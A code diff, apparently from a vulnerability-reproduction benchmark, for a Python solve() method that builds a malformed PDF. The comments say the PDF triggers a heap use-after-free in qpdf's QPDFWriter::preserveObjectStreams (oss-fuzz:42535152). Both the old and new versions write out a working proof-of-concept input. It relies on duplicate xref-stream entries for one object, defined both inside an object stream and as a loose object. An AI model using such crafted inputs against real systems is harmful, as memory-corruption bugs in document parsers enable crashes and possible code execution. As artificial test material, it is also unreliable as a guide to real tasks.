@@ -1,85 +1,101 @@
-import struct
+import zlib
 
 class Solution:
     def solve(self, src_path: str) -> bytes:
+        # Construct a PDF that triggers the Heap Use After Free in QPDFWriter::preserveObjectStreams
+        # vulnerability (oss-fuzz:42535152).
+        # The vulnerability is triggered by having multiple entries for the same object ID
+        # in the xref stream (or table), specifically involving object streams.
+        
+        header = b"%PDF-1.5\n%\xe2\xe3\xcf\xd3\n"
+        
+        # We will create objects:
+        # 1: Catalog
+        # 2: Pages
+        # 3: Page
+        # 4: Object Stream (containing Obj 5)
+        # 5: Regular Object (Duplicate definition)
+        # 6: XRef Stream (Contains duplicate entries for Obj 5)
+        
+        objects_content = []
+        
+        # Obj 1: Catalog
+        objects_content.append((1, b"<< /Type /Catalog /Pages 2 0 R >>"))
+        
+        # Obj 2: Pages
+        objects_content.append((2, b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>"))
+        
+        # Obj 3: Page
+        objects_content.append((3, b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 100 100] >>"))
+        
+        # Obj 5: The "loose" definition of Object 5
+        objects_content.append((5, b"<< /Type /Annot /Subtype /Widget >>"))
+        
+        # Obj 4: Object Stream
+        # It technically contains Obj 5.
+        # "5 0 " indicates Obj 5 is at offset 0.
+        stm_payload = b"5 0 << /Type /Annot /Subtype /Widget >>"
+        # /First is the offset to the first object's content (length of header "5 0 ")
+        stm_first = 4 
+        stm_dict = f"<< /Type /ObjStm /N 1 /First {stm_first} /Length {len(stm_payload)} >>".encode('ascii')
+        stm_block = stm_dict + b"\nstream\n" + stm_payload + b"\nendstream"
+        objects_content.append((4, stm_block))
+        
+        # Sort objects by ID
+        objects_content.sort(key=lambda x: x[0])
+        
+        body = b""
         offsets = {}
-        pdf = b"%PDF-1.7\n%\xe2\xe3\xcf\xd3\n"
+        current_pos = len(header)
         
-        # 1: ObjStm
-        offsets[1] = len(pdf)
-        obj2_content = b"<< /Type /FontDescriptor >>"
-        obj3_content = b"<< /Type /Font >>"
-        # 2 0 -> obj2_content, 3 0 -> obj3_content
-        header = f"2 0 3 {len(obj2_content)} ".encode('ascii')
-        data = header + obj2_content + obj3_content
+        for oid, content in objects_content:
+            offsets[oid] = current_pos
+            obj_blob = f"{oid} 0 obj\n".encode('ascii') + content + b"\nendobj\n"
+            body += obj_blob
+            current_pos += len(obj_blob)
+            
+        # Construct XRef Stream (Obj 6)
+        # W = [1, 3, 2] -> Type (1 byte), Field2 (3 bytes), Field3 (2 bytes)
+        # We define entries for:
+        # Range 0 (6 items): 0, 1, 2, 3, 4, 5(compressed)
+        # Range 5 (1 item): 5(uncompressed) -> DUPLICATE ENTRY
+        # Range 6 (1 item): 6
         
-        pdf += b"1 0 obj\n"
-        pdf += b"<< /Type /ObjStm /N 2 /First " + str(len(header)).encode('ascii') + b" /Length " + str(len(data)).encode('ascii') + b" >>\n"
-        pdf += b"stream\n"
-        pdf += data + b"\n"
-        pdf += b"endstream\n"
-        pdf += b"endobj\n"
+        entries = []
         
-        # 4: Catalog
-        offsets[4] = len(pdf)
-        pdf += b"4 0 obj\n"
-        pdf += b"<< /Type /Catalog /Pages 5 0 R >>\n"
-        pdf += b"endobj\n"
+        # Entry 0: Free
+        entries.append(b"\x00" + (0).to_bytes(3, 'big') + (65535).to_bytes(2, 'big'))
+        # Entry 1: Offset
+        entries.append(b"\x01" + offsets[1].to_bytes(3, 'big') + (0).to_bytes(2, 'big'))
+        # Entry 2: Offset
+        entries.append(b"\x01" + offsets[2].to_bytes(3, 'big') + (0).to_bytes(2, 'big'))
+        # Entry 3: Offset
+        entries.append(b"\x01" + offsets[3].to_bytes(3, 'big') + (0).to_bytes(2, 'big'))
+        # Entry 4: Offset (ObjStm)
+        entries.append(b"\x01" + offsets[4].to_bytes(3, 'big') + (0).to_bytes(2, 'big'))
+        # Entry 5a: Compressed (Type 2) in Obj 4, Index 0
+        entries.append(b"\x02" + (4).to_bytes(3, 'big') + (0).to_bytes(2, 'big'))
         
-        # 5: Pages
-        offsets[5] = len(pdf)
-        pdf += b"5 0 obj\n"
-        pdf += b"<< /Type /Pages /Count 1 /Kids [6 0 R] >>\n"
-        pdf += b"endobj\n"
+        # Entry 5b: Uncompressed (Type 1) at offsets[5] -> Duplicate ID 5
+        entries.append(b"\x01" + offsets[5].to_bytes(3, 'big') + (0).to_bytes(2, 'big'))
         
-        # 6: Page (References Obj 2)
-        offsets[6] = len(pdf)
-        pdf += b"6 0 obj\n"
-        pdf += b"<< /Type /Page /Parent 5 0 R /MediaBox [0 0 612 792] /Resources << /Font << /F1 2 0 R >> >> >>\n"
-        pdf += b"endobj\n"
+        # Entry 6: Offset (Obj 6, which starts at current_pos)
+        entries.append(b"\x01" + current_pos.to_bytes(3, 'big') + (0).to_bytes(2, 'big'))
         
-        # 7: XRef Stream
-        # IDs: 0, 1, 2, 2(dup), 3, 4, 5, 6, 7
-        # Index: [0 3 2 1 3 5]
+        xref_data = b"".join(entries)
+        comp_xref = zlib.compress(xref_data)
         
-        xref_rows = []
-        # 0: Free
-        xref_rows.append(b'\x00\x00\x00\xff')
-        # 1: Type 1 (ObjStm)
-        xref_rows.append(b'\x01' + struct.pack('>H', offsets[1]) + b'\x00')
+        # Index array: [0 6 5 1 6 1]
+        # 0 6 -> 0..5 (first 6 entries)
+        # 5 1 -> 5    (next 1 entry)
+        # 6 1 -> 6    (next 1 entry)
+        xref_dict = (
+            f"<< /Type /XRef /Size 7 /W [ 1 3 2 ] /Root 1 0 R "
+            f"/Index [ 0 6 5 1 6 1 ] /Length {len(comp_xref)} /Filter /FlateDecode >>"
+        ).encode('ascii')
         
-        # 2 (First entry): Type 1 (Uncompressed, pointing to offset of Obj 1)
-        # This creates ambiguity/conflict for Obj 2
-        xref_rows.append(b'\x01' + struct.pack('>H', offsets[1]) + b'\x00')
+        obj6 = f"6 0 obj\n".encode('ascii') + xref_dict + b"\nstream\n" + comp_xref + b"\nendstream\nendobj\n"
         
-        # 2 (Duplicate): Type 2 (Compressed, in ObjStm 1 at index 0)
-        xref_rows.append(b'\x02' + struct.pack('>H', 1) + b'\x00')
+        trailer = f"\nstartxref\n{current_pos}\n%%EOF\n".encode('ascii')
         
-        # 3: Type 2 (Compressed, in ObjStm 1 at index 1)
-        xref_rows.append(b'\x02' + struct.pack('>H', 1) + b'\x01')
-        
-        # 4, 5, 6 Type 1
-        xref_rows.append(b'\x01' + struct.pack('>H', offsets[4]) + b'\x00')
-        xref_rows.append(b'\x01' + struct.pack('>H', offsets[5]) + b'\x00')
-        xref_rows.append(b'\x01' + struct.pack('>H', offsets[6]) + b'\x00')
-        
-        # 7 (placeholder)
-        xref_rows.append(b'\x01\x00\x00\x00')
-        
-        offsets[7] = len(pdf)
-        xref_rows[-1] = b'\x01' + struct.pack('>H', offsets[7]) + b'\x00'
-        
-        stm_content = b"".join(xref_rows)
-        
-        pdf += b"7 0 obj\n"
-        pdf += b"<< /Type /XRef /Size 8 /W [1 2 1] /Root 4 0 R /Index [0 3 2 1 3 5] /Length " + str(len(stm_content)).encode('ascii') + b" >>\n"
-        pdf += b"stream\n"
-        pdf += stm_content + b"\n"
-        pdf += b"endstream\n"
-        pdf += b"endobj\n"
-        
-        pdf += b"startxref\n"
-        pdf += str(offsets[7]).encode('ascii') + b"\n"
-        pdf += b"%%EOF\n"
-        
-        return pdf
+        return header + body + obj6 + trailer
